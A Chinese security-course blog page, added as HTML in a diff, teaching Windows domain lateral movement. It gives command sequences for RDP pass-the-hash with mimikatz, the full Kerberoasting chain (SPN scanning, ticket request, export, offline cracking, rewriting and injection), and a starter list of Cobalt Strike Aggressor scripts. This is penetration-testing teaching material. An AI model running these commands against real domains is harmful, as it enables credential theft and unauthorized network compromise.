@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP">
+<meta property="og:url" content="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/69-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/index.html">
+<meta property="og:site_name" content="HVVL404">
+<meta property="og:description" content="69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172214365-494543646.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172422376-992728130.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172710301-1145696955.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172718796-279008017.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172907639-1451744156.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173031914-922329132.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173040493-909754801.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173203951-1622740767.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173234150-1857144239.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173321895-1100027835.png">
+<meta property="article:published_time" content="2023-05-04T11:19:02.933Z">
+<meta property="article:modified_time" content="2023-05-06T16:06:49.118Z">
+<meta property="article:author" content="HVVL404">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172214365-494543646.png">
+
+<link rel="canonical" href="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/69-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>69-内网安全-域横向CobaltStrike&SPN&RDP | HVVL404</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">HVVL404</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="house fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="categories fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/69-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="HVVL404">
+      <meta itemprop="description" content="欢迎来到我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HVVL404">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          69-内网安全-域横向CobaltStrike&SPN&RDP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-04 19:19:02" itemprop="dateCreated datePublished" datetime="2023-05-04T19:19:02+08:00">2023-05-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-07 00:06:49" itemprop="dateModified" datetime="2023-05-07T00:06:49+08:00">2023-05-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/" itemprop="url" rel="index"><span itemprop="name">小迪安全（内网篇）</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP     </p>
+<span id="more"></span>
+
+<p>思维导图</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172214365-494543646.png" alt="img"></p>
+<p>本课重点：</p>
+<ul>
+<li>案例1：域横向移动RDP传递-Mimikatz</li>
+<li>案例2：域横向移动SPN服务-探针,请求,导出,破解,重写</li>
+<li>案例3：域横向移动测试流程一把梭哈-CobaltStrike初体验</li>
+</ul>
+<p><strong>案例1-域横向移动RDP传递-Mimikatz</strong></p>
+<p>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作。</p>
+<p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RDP明文密码链接</span><br><span class="line">windows: mstsc</span><br><span class="line">mstsc.exe /console /v:192.168.3.21 /admin</span><br><span class="line">linux: rdesktop 192.168.3.21:3389</span><br><span class="line"> </span><br><span class="line">RDP密文HASH链接</span><br><span class="line">windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，</span><br><span class="line">同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；</span><br><span class="line"> </span><br><span class="line">开启命令：</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"> </span><br><span class="line">开启后运行：</span><br><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172422376-992728130.png" alt="img"></p>
+<p><strong>案例2-域横向移动SPN服务-探针,请求,导出,破解,重写</strong></p>
+<p>kerberos中的spn详解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8082623.html">https://www.cnblogs.com/backlion/p/8082623.html</a></p>
+<p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p>
+<p>SPN扫描</p>
+<ul>
+<li>当计算机加入域时,主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。</li>
+<li>SPN扫描也称为”扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口(不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志)。因为SPN查询是Kerberos票据行为的一部分，所以检测难度很大。</li>
+<li>由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。</li>
+<li>在域环境中，发现服务的最好办法就是通过”SPN扫描”。通过请求特定SPN类型服务主体名称来查找服务。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1探针</span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* | findstr &quot;MSSQL&quot;</span><br><span class="line"> </span><br><span class="line">2请求票据</span><br><span class="line"># 删除缓存票据</span><br><span class="line">klist purge</span><br><span class="line"> </span><br><span class="line"># powershell请求</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;</span><br><span class="line"> </span><br><span class="line"># mimikatz请求</span><br><span class="line">mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</span><br><span class="line"> </span><br><span class="line"># 查看票据</span><br><span class="line">klist</span><br><span class="line"> </span><br><span class="line">3导出票据</span><br><span class="line"># mimikatz</span><br><span class="line">mimikatz.exe &quot;kerberos::list /export&quot;</span><br><span class="line"> </span><br><span class="line">4破解票据</span><br><span class="line"># 破解工具tgsrepcrack.py python3环境运行</span><br><span class="line">python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br><span class="line"> </span><br><span class="line">5重写票据</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</span><br><span class="line"> </span><br><span class="line">6利用</span><br></pre></td></tr></table></figure>
+
+<p>kerberoast下载：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
+<p>环境准备</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172710301-1145696955.png" alt="img"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172718796-279008017.png" alt="img"></p>
+<p>案例演示</p>
+<p>&lt;1&gt;探针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* | findstr &quot;MSSQL&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923172907639-1451744156.png" alt="img"></p>
+<p>探针到这么多服务后，我们完全可以按照相关服务的常规攻击手段进行攻击，不一定非要用本案例演示的破解票据手段。</p>
+<p>&lt;2&gt;请求票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">klist purge //删除缓存票据</span><br><span class="line">klist   //查看票据</span><br><span class="line"> </span><br><span class="line"># 请求票据</span><br><span class="line"># powershell请求</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;</span><br><span class="line"> </span><br><span class="line"># 或者mimikatz请求</span><br><span class="line">mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173031914-922329132.png" alt="img"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173040493-909754801.png" alt="img"></p>
+<p>&lt;3&gt;导出票据（到mimikatz运行目录）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz</span><br><span class="line">mimikatz.exe &quot;kerberos::list /export&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173203951-1622740767.png" alt="img"></p>
+<p>&lt;4&gt;破解票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 破解工具tgsrepcrack.py python3环境运行（将票据拖到本地破解）</span><br><span class="line">python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173234150-1857144239.png" alt="img"></p>
+<p>破解成功，密码是Admin12345，可以为后续渗透测试做准备。</p>
+<p>这种方法得到只是mssql服务账户密码（权限不大），而mssql系统管理员账户密码我们是无法得到的。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202109/1375459-20210923173321895-1100027835.png" alt="img"></p>
+<p>&lt;5&gt;重写票据（属于后续攻击，不一定会成功，-u500指的是管理员用户，-g512指的是管理员组）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存</span><br></pre></td></tr></table></figure>
+
+<p>&lt;6&gt;利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir //xxx.xxx.xxx.xxx/c$</span><br></pre></td></tr></table></figure>
+
+<p><strong>案例3-域横向移动测试流程一把梭哈-CobaltStrike初体验</strong></p>
+<p>CobaltStrike4.0用户手册：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q">https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q</a> 提取码:dtm2</p>
+<p>CS神器大概流程：启动-配置-监听-执行-上线-提权-信息收集(网络,凭证,定位等)-渗透</p>
+<p>1.关于启动及配置讲解<br>2.关于提权及插件加载<br>3.关于信息收集命令讲解<br>4.关于视图自动化功能讲解</p>
+<p>CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/harleyQu1nn/AggressorScripts</span><br><span class="line">https://github.com/Und3rf10w/Aggressor-scripts</span><br><span class="line">https://github.com/001SPARTaN/aggressor_scripts</span><br><span class="line">https://github.com/rasta-mouse/Aggressor-Script</span><br><span class="line">https://github.com/threatexpress/aggressor-scripts</span><br><span class="line">https://github.com/ramen0x3f/AggressorScripts</span><br><span class="line">https://github.com/FortyNorthSecurity/AggressorAssessor</span><br><span class="line">https://github.com/michalkoczwara/aggressor_scripts_collection</span><br><span class="line">https://github.com/ars3n11/Aggressor-Scripts</span><br><span class="line">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</span><br><span class="line">https://github.com/bluscreenofjeff/AggressorScripts</span><br><span class="line">https://github.com/vysecurity/Aggressor-VYSEC</span><br><span class="line">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</span><br><span class="line">https://github.com/rsmudge/ElevateKit （第三方提权攻击）</span><br><span class="line">https://github.com/QAX-A-Team/CobaltStrike-Toolset</span><br><span class="line">https://github.com/DeEpinGh0st/Erebus （Erebus CobaltStrike后渗透测试插件，持续更新）</span><br><span class="line">https://github.com/branthale/CobaltStrikeCNA</span><br><span class="line">https://github.com/pandasec888/taowu-cobalt-strike（仓库已关闭）</span><br></pre></td></tr></table></figure>
+
+<p>红队实战演练环境：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码: taqu</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://hackergu.com/kerberos-sec-spn-search/">https://hackergu.com/kerberos-sec-spn-search/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Waffle666/article/details/120380336">https://blog.csdn.net/Waffle666/article/details/120380336</a></p>
+
+    </div>
+
+    
+    
+    
+	
+        <div class="reward-container">
+  <div>原创技术分享，您的支持将鼓励我继续创作</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="HVVL404 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="HVVL404 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>HVVL404
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/69-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/" title="69-内网安全-域横向CobaltStrike&amp;SPN&amp;RDP">http://example.com/2023/05/04/小迪安全（内网篇）/69-内网安全-域横向CobaltStrike&SPN&RDP/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/68-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" rel="prev" title="68-内网安全-域横向PTH&PTK&PTT哈希票据传递">
+      <i class="fa fa-chevron-left"></i> 68-内网安全-域横向PTH&PTK&PTT哈希票据传递
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/71-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" rel="next" title="71-内网安全-域横向网络&传输&应用层隧道技术">
+      71-内网安全-域横向网络&传输&应用层隧道技术 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="HVVL404"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">HVVL404</p>
+  <div class="site-description" itemprop="description">欢迎来到我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HVVL404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HVVL404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-04 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HVVL404</span>
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共58k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
